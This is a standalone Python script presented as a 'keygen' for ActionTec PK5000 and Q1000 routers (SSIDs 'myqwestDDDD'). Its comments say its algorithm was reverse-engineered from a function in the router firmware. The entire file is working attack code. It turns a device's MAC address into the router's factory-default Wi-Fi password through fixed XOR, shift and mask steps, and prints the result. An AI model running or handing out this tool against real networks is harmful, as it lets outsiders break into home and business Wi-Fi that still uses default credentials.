# keygen for the ActionTec PK5000 and Q1000 
# SSID are myqwestDDDD
# use mac-1 from the sticker
# Huge thank you to selenium on hashkiller for the QEMU implementation of the AEI_wlGenerateQwestDefaultKey
# function in /lib/libwlmngr.so

import hashlib
import argparse

def actiontec(mac):

	wifi_chan = 0

	mac_bytes = []
	for i in range(0, 12, 2):
		mac_bytes.append(mac[i:i+2].upper())

	mac_byte_values = []
	for i in mac_bytes:
		mac_byte_values.append(int(i, 16))

	input_string = mac_bytes[0]

	oui_value = mac_byte_values[0]
	for i in range(1, 3):
		oui_value = oui_value * 256
		oui_value = oui_value + mac_byte_values[i]

	nic_value = mac_byte_values[3]
	for i in range(4, 6):
		nic_value = nic_value * 256
		nic_value = nic_value + mac_byte_values[i]

	value1 = nic_value + 1 + 2 * wifi_chan
	value1b = value1 ^ int("ffffffff", 16)
	value2 = value1b + oui_value
	value2 = value2 & int("ffffffff", 16)
	string1 = hex(value2)[2:].zfill(8).upper()

	value3a = value1 >> 1
	value3b = value3a ^ int("ffffffff", 16)
	value4 = value3b + oui_value
	value4 = value4 & int("ffffffff", 16)
	string2 = hex(value4)[2:].zfill(8).upper()

	value5a = value1 >> 2
	value5b = value5a ^ int("ffffffff", 16)
	value6 = value5b + oui_value
	value6 = value6 & int("00ffffff", 16)
	string3 = hex(value6)[2:].zfill(6).upper()

	value7 = value1 + oui_value
	value7 = value7 & int("0000ffff", 16)
	string4 = hex(value7)[2:].zfill(4).upper()

	password = (string1 + string2 + string3 + string4).lower()
	print(password)

parser = argparse.ArgumentParser(description='ActionTec PK5000 and Q1000  Keygen')
parser.add_argument('mac', help='Mac address (mac-1)')
args = parser.parse_args()

actiontec(args.mac)